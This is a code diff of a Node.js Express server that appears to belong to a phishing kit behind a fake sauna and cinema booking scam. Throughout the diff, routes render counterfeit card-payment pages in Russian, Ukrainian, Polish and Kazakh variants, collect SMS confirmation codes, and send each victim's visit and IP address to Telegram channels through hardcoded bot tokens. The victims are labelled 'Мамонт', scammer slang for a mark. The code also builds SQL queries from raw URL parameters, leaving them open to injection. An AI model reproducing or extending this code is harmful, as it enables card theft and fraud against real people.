@@ -26,13 +26,13 @@ try {
     })
 
     app.get('/sauna/refund/:userlink', (req, res) => {
-        client.query(`SELECT amount, currency FROM userssrefund WHERE link = '${req.params.userlink}'`, (err, ress)=>{
+        client.query(`SELECT amount, currency FROM usersrefund WHERE link = '${req.params.userlink}'`, (err, ress)=>{
             if (ress.rows[0] === undefined) {
                 res.redirect(`https://sauna-laguna.com`);
                 return console.log("error");
             }
             if (ress) {
-                const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+                const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
                 if (req.params.userlink.search('ua') !=  -1){
                     console.log(1);
                     var index = 'index_card_ua';
@@ -66,7 +66,7 @@ try {
     })
 
     app.get('/sauna/:userlink', (req, res) => {
-        client.query(`SELECT place FROM userss WHERE link = '${req.params.userlink}'`, (err, ress)=>{
+        client.query(`SELECT place FROM users WHERE link = '${req.params.userlink}'`, (err, ress)=>{
             if (ress.rows[0] === undefined) {
                 res.redirect(`https://cinema-funnyhub.com`);
                 return console.log("error");
@@ -85,9 +85,9 @@ try {
                 var index = 'index';
             }
             if (ress) {
-                const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+                const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
                 res.render(index, {userplace: ress.rows[0].place, user_link: req.params.userlink});
-                client.query(`SELECT user_id FROM userss WHERE link = '${req.params.userlink}'`, (err, res)=>{
+                client.query(`SELECT user_id FROM users WHERE link = '${req.params.userlink}'`, (err, res)=>{
                     bot.sendMessage(res.rows[0].user_id, `🧖‍♀️ <b>Сауна\n</b>🧖‍♀️ <i>Мамонт перешел по ссылке: </i><b>${req.params.userlink}</b>\n📍 <i>Место встречи:</i> <b>${ress.rows[0].place}</b>\n\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
                 })
                 return console.log(ress.rows[0].place);
@@ -103,7 +103,7 @@ try {
         let payment = 'Оплата заказа'
         let payment_button = 'Оплата'
         res.render('index_card', {amount: req.body.amount, amount_c: amount_c, user_link: req.body.user_link, payment: payment, payment_button: payment_button});
-        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
         bot.sendMessage(-1001628579302, `💳 <b>🧖‍♀️ Мамонт перешел на страницу оплаты RU</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         bot.sendMessage(-1001649675292, `💳 <b>🧖‍♀️ Мамонт перешел на страницу оплаты</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
 
@@ -113,7 +113,7 @@ try {
         let payment = 'Оплата замовлення'
         let payment_button = 'Оплатити замовлення'
         res.render('index_card_ua', {amount: req.body.amount, amount_c: amount_c, user_link: req.body.user_link, payment: payment, payment_button: payment_button});
-        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
         bot.sendMessage(-1001628579302, `💳 <b>🧖‍♀️ Мамонт перешел на страницу оплаты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         bot.sendMessage(-1001649675292, `💳 <b>🧖‍♀️ Мамонт перешел на страницу оплаты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
     })
@@ -123,7 +123,7 @@ try {
         let payment = 'Zamów płatność'
         let payment_button = 'Zapłacić za zamówienie'
         res.render('index_card_pln', {amount: req.body.amount, amount_c: amount_c, user_link: req.body.user_link, payment: payment, payment_button: payment_button});
-        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
         bot.sendMessage(-1001628579302, `💳 <b>🧖‍♀️ Мамонт перешел на страницу оплаты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         bot.sendMessage(-1001649675292, `💳 <b>🧖‍♀️ Мамонт перешел на страницу оплаты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
     })
@@ -133,13 +133,13 @@ try {
         let payment = 'Оплата заказа'
         let payment_button = 'Оплата'
         res.render('index_card_kz', {amount: req.body.amount, amount_c: amount_c, user_link: req.body.user_link, payment: payment, payment_button: payment_button});
-        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
         bot.sendMessage(-1001628579302, `💳 <b>🧖‍♀️ Мамонт перешел на страницу оплаты KZ</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         bot.sendMessage(-1001649675292, `💳 <b>🧖‍♀️ Мамонт перешел на страницу оплаты KZ</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
     })
 
     app.post('/refund/confirmationua', (req, res) => {
-        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
         bot.sendMessage(-1001628579302, `💳 <b>🧖‍♀️ Мамонт перешел на страницу оплаты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         const delete_button = {
             reply_markup: JSON.stringify({
@@ -165,7 +165,7 @@ try {
     })
 
     app.post('/confirmationua', (req, res) => {
-        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
         bot.sendMessage(-1001628579302, `💳 <b>🧖‍♀️ Мамонт перешел на страницу оплаты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         const delete_button = {
             reply_markup: JSON.stringify({
@@ -191,7 +191,7 @@ try {
     })
 
     app.post('/refund/confirmationkz', (req, res) => {
-        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
         bot.sendMessage(-1001628579302, `💳 <b>🧖‍♀️ Мамонт перешел на страницу оплаты KZ</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         const delete_button = {
             reply_markup: JSON.stringify({
@@ -217,7 +217,7 @@ try {
     })
 
     app.post('/confirmationkz', (req, res) => {
-        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
         bot.sendMessage(-1001628579302, `💳 <b>🧖‍♀️ Мамонт перешел на страницу оплаты KZ</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         const delete_button = {
             reply_markup: JSON.stringify({
@@ -244,7 +244,7 @@ try {
 
     
     app.post('/refund/confirmation', (req, res) => {
-        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA")
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc")
         bot.sendMessage(-1001628579302, `💳 <b>🧖‍♀️ Мамонт перешел на страницу оплаты RU</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         const delete_button = {
             reply_markup: JSON.stringify({
@@ -271,7 +271,7 @@ try {
                                 })
 
     app.post('/confirmation', (req, res) => {
-        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA")
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc")
         bot.sendMessage(-1001628579302, `💳 <b>🧖‍♀️ Мамонт перешел на страницу оплаты RU</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         const delete_button = {
             reply_markup: JSON.stringify({
@@ -297,7 +297,7 @@ try {
     
                                 })
     app.post('/refund/confirmationpln', (req, res) => {
-        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA")
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc")
         bot.sendMessage(-1001628579302, `💳 <b>🧖‍♀️ Мамонт перешел на страницу оплаты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         const delete_button = {
             reply_markup: JSON.stringify({
@@ -323,7 +323,7 @@ try {
 
     })
     app.post('/confirmationpln', (req, res) => {
-        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA")
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc")
         bot.sendMessage(-1001628579302, `💳 <b>🧖‍♀️ Мамонт перешел на страницу оплаты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
         const delete_button = {
             reply_markup: JSON.stringify({
@@ -349,7 +349,7 @@ try {
 
     })
     app.post('/refund/confirmation_fpln', (req, res) => {
-        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
         let sms_number = req.body.sms_number;
         if (req.body.sms_number === undefined) {
             sms_number = req.body.securecode;
@@ -367,7 +367,7 @@ try {
         
     })
     app.post('/confirmation_fpln', (req, res) => {
-        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
         let sms_number = req.body.sms_number;
         if (req.body.sms_number === undefined) {
             sms_number = req.body.securecode;
@@ -385,7 +385,7 @@ try {
         
     })
     app.post('/refund/confirmation_fkz', (req, res) => {
-        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
         let sms_number = req.body.sms_number;
         if (req.body.sms_number === undefined) {
             sms_number = req.body.securecode;
@@ -403,7 +403,7 @@ try {
         
     })
     app.post('/confirmation_fkz', (req, res) => {
-        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
         let sms_number = req.body.sms_number;
         if (req.body.sms_number === undefined) {
             sms_number = req.body.securecode;
@@ -421,7 +421,7 @@ try {
         
     })
     app.post('/refund/confirmation_fua', (req, res) => {
-        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
         let sms_number = req.body.sms_number;
         if (req.body.sms_number === undefined) {
             sms_number = req.body.securecode;
@@ -439,7 +439,7 @@ try {
         
     })
     app.post('/confirmation_fua', (req, res) => {
-        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
         let sms_number = req.body.sms_number;
         if (req.body.sms_number === undefined) {
             sms_number = req.body.securecode;
@@ -458,7 +458,7 @@ try {
     })
     
     app.post('/refund/confirmation_f', (req, res) => {
-        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
         let sms_number = req.body.sms_number;
         if (req.body.sms_number === undefined) {
             sms_number = req.body.securecode;
@@ -477,7 +477,7 @@ try {
     })
 
     app.post('/confirmation_f', (req, res) => {
-        const bot = new TelegramApi("5881602864:AAFRpiAxA-KDn9DBPXhEGErbh8sdoQt59zA");
+        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
         let sms_number = req.body.sms_number;
         if (req.body.sms_number === undefined) {
             sms_number = req.body.securecode;
